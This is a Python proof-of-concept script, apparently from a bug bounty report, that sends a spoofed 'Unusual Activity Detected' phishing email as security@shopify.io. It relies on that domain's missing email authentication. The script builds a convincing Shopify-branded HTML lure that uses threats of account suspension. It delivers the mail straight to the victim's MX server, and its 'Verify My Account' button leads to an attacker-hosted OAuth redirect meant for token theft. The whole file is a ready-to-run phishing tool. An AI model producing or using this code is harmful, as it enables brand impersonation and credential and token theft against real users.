#!/usr/bin/env python3
"""
send_phish.py - Shopify OAuth Chain POC: Email Spoofing Module

This script sends a spoofed phishing email from "Shopify Security <security@shopify.io>"
to demonstrate that shopify.io has zero email authentication (no SPF, MX, or DMARC),
allowing anyone to send emails that appear to originate from @shopify.io addresses.

The email mimics a legitimate Shopify "Unusual Activity Detected" security alert and
directs the victim to a fake verification page that chains into OAuth token theft.

USAGE:
    python3 send_phish.py <target_email> [--sender-ip ATTACKER_IP]

REQUIREMENTS:
    - Python 3.7+
    - No external dependencies (uses stdlib smtplib, email, etc.)
    - Network access to target's MX servers

AUTHOR: xbyteid (HackerOne)
DISCLAIMER: For authorized bug bounty testing only.
"""

import smtplib
import socket
import sys
import argparse
import uuid
import datetime
import email.utils
import logging
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

# Spoofed sender — shopify.io has NO SPF, NO MX, NO DMARC records
SENDER_NAME = "Shopify Security"
SENDER_EMAIL = "security@shopify.io"

# Shopify brand colors
SHOPIFY_PURPLE = "#5c6ac4"
SHOPIFY_GREEN = "#008060"
SHOPIFY_BG = "#f4f6f8"

# Logging
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s: %(message)s"
)
log = logging.getLogger("send_phish")


def get_mx_hosts(domain: str) -> list:
    """
    Resolve MX records for a given domain using a lightweight DNS query.
    Falls back to dnspython if available, otherwise uses socket-based fallback.
    """
    try:
        import dns.resolver
        answers = dns.resolver.resolve(domain, "MX")
        mx_records = sorted(answers, key=lambda r: r.preference)
        return [str(r.exchange).rstrip(".") for r in mx_records]
    except ImportError:
        # Fallback: try smtplib's built-in (not available), use nslookup
        log.warning("dnspython not installed; attempting direct delivery to %s", domain)
        return [domain]


def build_email(target_email: str, attacker_ip: str) -> MIMEMultipart:
    """
    Construct the spoofed phishing email with realistic Shopify branding.

    The email contains:
    - Fake "Unusual Activity Detected" alert
    - Target's email address, fake IP, timestamp
    - Urgency language to pressure quick action
    - A "Verify My Account" button pointing to the attacker's OAuth redirect server
    """

    now = datetime.datetime.utcnow()
    timestamp_str = now.strftime("%B %d, %Y at %I:%M %p UTC")
    fake_ip = "203.0.113." + str(hash(target_email) % 255)  # deterministic fake IP
    message_id = f"<{uuid.uuid4()}@shopify.io>"
    oauth_url = f"https://{attacker_ip}:5000/"

    msg = MIMEMultipart("alternative")
    msg["From"] = f"{SENDER_NAME} <{SENDER_EMAIL}>"
    msg["To"] = target_email
    msg["Subject"] = "Action Required: Unusual Activity Detected on Your Shopify Account"
    msg["Message-ID"] = message_id
    msg["Date"] = email.utils.formatdate(localtime=True)
    msg["X-Mailer"] = "Shopify Security Systems"
    msg["X-Priority"] = "1"
    msg["Reply-To"] = SENDER_EMAIL
    # Headers to increase legitimacy
    msg["List-Unsubscribe"] = f"<mailto:unsubscribe@shopify.io>"

    # Plain-text fallback
    text_body = f"""Shopify Security Alert

Unusual Activity Detected on Your Shopify Account

Dear Shopify Merchant,

Our security systems have detected unusual activity on your account associated with {target_email}.

Activity Details:
- Time: {timestamp_str}
- IP Address: {fake_ip}
- Location: Detected from an unrecognized location
- Action: Multiple failed login attempts

If this was not you, your account may be compromised. Please verify your identity immediately to prevent unauthorized access.

Verify My Account: {oauth_url}

Failure to verify within 24 hours will result in temporary account suspension to protect your store and customer data.

This is an automated security notification from Shopify.
Shopify Inc., 150 Elgin Street, Ottawa, ON, K2P 1L4, Canada
"""

    # HTML body with Shopify-branded styling
    html_body = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="margin:0;padding:0;background-color:{SHOPIFY_BG};font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
    <table width="100%" cellpadding="0" cellspacing="0" style="background-color:{SHOPIFY_BG};padding:40px 0;">
        <tr>
            <td align="center">
                <table width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.08);">
                    <!-- Header -->
                    <tr>
                        <td style="background-color:{SHOPIFY_PURPLE};padding:24px 40px;text-align:center;">
                            <h1 style="color:#ffffff;font-size:20px;margin:0;font-weight:600;">Shopify Security</h1>
                        </td>
                    </tr>
                    <!-- Alert Icon -->
                    <tr>
                        <td style="padding:32px 40px 16px;text-align:center;">
                            <div style="width:64px;height:64px;border-radius:50%;background-color:#fff3e0;margin:0 auto;display:flex;align-items:center;justify-content:center;font-size:32px;">&#9888;</div>
                        </td>
                    </tr>
                    <!-- Alert Title -->
                    <tr>
                        <td style="padding:0 40px 16px;text-align:center;">
                            <h2 style="color:#1a1a1a;font-size:24px;margin:0;font-weight:700;">Unusual Activity Detected</h2>
                            <p style="color:#637381;font-size:15px;margin:8px 0 0;">We noticed suspicious activity on your Shopify account.</p>
                        </td>
                    </tr>
                    <!-- Details Box -->
                    <tr>
                        <td style="padding:16px 40px;">
                            <table width="100%" cellpadding="12" cellspacing="0" style="background-color:#f9fafb;border:1px solid #e1e3e5;border-radius:6px;">
                                <tr>
                                    <td style="font-size:14px;color:#637381;width:140px;">Account Email:</td>
                                    <td style="font-size:14px;color:#1a1a1a;font-weight:600;">{target_email}</td>
                                </tr>
                                <tr>
                                    <td style="font-size:14px;color:#637381;border-top:1px solid #e1e3e5;">Time:</td>
                                    <td style="font-size:14px;color:#1a1a1a;font-weight:600;border-top:1px solid #e1e3e5;">{timestamp_str}</td>
                                </tr>
                                <tr>
                                    <td style="font-size:14px;color:#637381;border-top:1px solid #e1e3e5;">IP Address:</td>
                                    <td style="font-size:14px;color:#bf360c;font-weight:600;border-top:1px solid #e1e3e5;">{fake_ip}</td>
                                </tr>
                                <tr>
                                    <td style="font-size:14px;color:#637381;border-top:1px solid #e1e3e5;">Status:</td>
                                    <td style="font-size:14px;color:#bf360c;font-weight:600;border-top:1px solid #e1e3e5;">Multiple Failed Login Attempts</td>
                                </tr>
                            </table>
                        </td>
                    </tr>
                    <!-- Urgency Message -->
                    <tr>
                        <td style="padding:8px 40px 16px;">
                            <p style="font-size:14px;color:#637381;margin:0;line-height:1.6;">
                                If this was not you, your account may be compromised.
                                Please verify your identity immediately to prevent unauthorized access.
                            </p>
                        </td>
                    </tr>
                    <!-- CTA Button -->
                    <tr>
                        <td style="padding:8px 40px 24px;text-align:center;">
                            <a href="{oauth_url}"
                               style="display:inline-block;background-color:{SHOPIFY_GREEN};color:#ffffff;font-size:16px;font-weight:600;padding:14px 48px;border-radius:6px;text-decoration:none;box-shadow:0 2px 4px rgba(0,128,96,0.3);">
                                Verify My Account
                            </a>
                            <p style="font-size:12px;color:#919eab;margin:12px 0 0;">
                                This link expires in 24 hours. Failure to verify will result in temporary account suspension.
                            </p>
                        </td>
                    </tr>
                    <!-- Footer -->
                    <tr>
                        <td style="background-color:#f9fafb;padding:20px 40px;border-top:1px solid #e1e3e5;">
                            <p style="font-size:12px;color:#919eab;margin:0;text-align:center;line-height:1.6;">
                                This is an automated security notification from Shopify Inc.<br>
                                150 Elgin Street, Suite 800, Ottawa, ON K2P 1L4, Canada<br>
                                <a href="https://www.shopify.com" style="color:{SHOPIFY_PURPLE};text-decoration:none;">shopify.com</a>
                            </p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
</body>
</html>"""

    msg.attach(MIMEText(text_body, "plain", "utf-8"))
    msg.attach(MIMEText(html_body, "html", "utf-8"))

    return msg


def send_email(target_email: str, msg: MIMEMultipart) -> bool:
    """
    Deliver the spoofed email via direct SMTP to the target's MX server.
    This bypasses the sender's own mail infrastructure entirely.
    """
    target_domain = target_email.split("@")[1]
    mx_hosts = get_mx_hosts(target_domain)

    if not mx_hosts:
        log.error("Could not resolve MX records for %s", target_domain)
        return False

    for mx in mx_hosts:
        try:
            log.info("Attempting delivery via MX: %s", mx)
            with smtplib.SMTP(mx, 25, timeout=30) as server:
                server.set_debuglevel(0)
                server.ehlo("mail.shopify.io")
                try:
                    server.starttls()
                    server.ehlo("mail.shopify.io")
                except smtplib.SMTPException:
                    log.warning("TLS not supported by %s, continuing unencrypted", mx)

                # Send the spoofed email — shopify.io has no SPF so this will pass
                server.sendmail(SENDER_EMAIL, [target_email], msg.as_string())
                log.info("Email successfully delivered to %s via %s", target_email, mx)
                return True

        except (socket.timeout, smtplib.SMTPException, ConnectionError, OSError) as e:
            log.warning("Failed via %s: %s", mx, e)
            continue

    log.error("All MX delivery attempts failed for %s", target_email)
    return False


def main():
    parser = argparse.ArgumentParser(
        description="Shopify OAuth Chain POC - Email Spoofing Module",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Example: python3 send_phish.py victim@example.com --sender-ip 1.2.3.4"
    )
    parser.add_argument("target_email", help="Email address of the target")
    parser.add_argument(
        "--sender-ip",
        default=socket.gethostbyname(socket.gethostname()),
        help="Attacker IP where oauth_redirect.py is running (default: auto-detect)"
    )
    args = parser.parse_args()

    log.info("=" * 60)
    log.info("Shopify OAuth Chain POC - Email Spoofing")
    log.info("=" * 60)
    log.info("Target:  %s", args.target_email)
    log.info("From:    %s <%s>", SENDER_NAME, SENDER_EMAIL)
    log.info("OAuth:   https://%s:5000/", args.sender_ip)
    log.info("")

    # Build the email
    msg = build_email(args.target_email, args.sender_ip)

    # Send it
    if send_email(args.target_email, msg):
        log.info("")
        log.info("SUCCESS: Spoofed email delivered to %s", args.target_email)
        log.info("The victim should see a 'Shopify Security' email from security@shopify.io")
        log.info("with a 'Verify My Account' button pointing to https://%s:5000/", args.sender_ip)
    else:
        log.error("FAILED: Could not deliver email to %s", args.target_email)
        sys.exit(1)


if __name__ == "__main__":
    main()
